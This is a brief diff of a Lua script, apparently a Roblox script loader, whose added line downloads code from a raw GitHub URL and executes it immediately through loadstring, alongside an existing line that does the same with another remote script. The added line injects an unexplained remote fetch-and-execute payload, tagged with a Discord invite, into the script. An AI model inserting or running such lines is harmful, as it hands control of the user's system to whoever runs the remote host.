@@ -12,3 +12,4 @@ _G.LRMConfig = {
 }
     
 loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
